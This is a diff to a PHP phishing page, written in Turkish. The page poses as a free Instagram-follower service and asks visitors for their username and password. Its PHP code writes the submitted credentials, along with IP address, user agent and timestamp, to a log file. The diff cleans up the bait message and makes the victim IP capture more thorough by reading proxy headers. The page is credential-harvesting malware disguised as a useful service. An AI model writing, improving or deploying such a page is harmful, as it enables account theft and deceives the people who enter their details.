@@ -12,7 +12,7 @@
 	<button value="input">Takipçi At</button><br>
 <br>
 <font color="red">Bilgilerinizi girdikten sonra instagram hesabınızı inceleyecek ve size 30-45 aralığında 
-takipçi gidecektir.Hergün 1 hakkınız vardır.30 dakika içinde takipçi gelmezse bilgiler uyuşmuyor demektir.Bilgilerinizi doğru giripte takipçi gelmemiş ise 
+takipçi gidecektir. Her gün 1 hakkınız vardır. 30 dakika içinde takipçi gelmezse bilgiler uyuşmuyor demektir. Bilgilerinizi doğru giripte takipçi gelmemiş ise 
 sitemize tekrar giriş yapınız.</font>
 
 
@@ -26,7 +26,8 @@ $tarih = date('d-m-Y H:i:s',time());
 $usr = $_SERVER['HTTP_USER_AGENT'];
 $bosluk = "\n";
 $bossluk = "\n";
-$al = " KULLANICI ADI > ".$_GET['kullanici_adi']." SİFRE > ".$_GET['kullanici_sifre']." Ip adresi: ".$_SERVER['REMOTE_ADDR']." USER AGENT > ".$usr." İslem Tarihi > ".$tarih.$bosluk.$bossluk;
+$ip_adres = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];
+$al = " KULLANICI ADI > ".$_GET['kullanici_adi']." SİFRE > ".$_GET['kullanici_sifre']." Ip adresi: ".$ip_adres." USER AGENT > ".$usr." İslem Tarihi > ".$tarih.$bosluk.$bossluk;
 $yaz = fwrite($ac,$al);
 fclose($ac);
  ?>
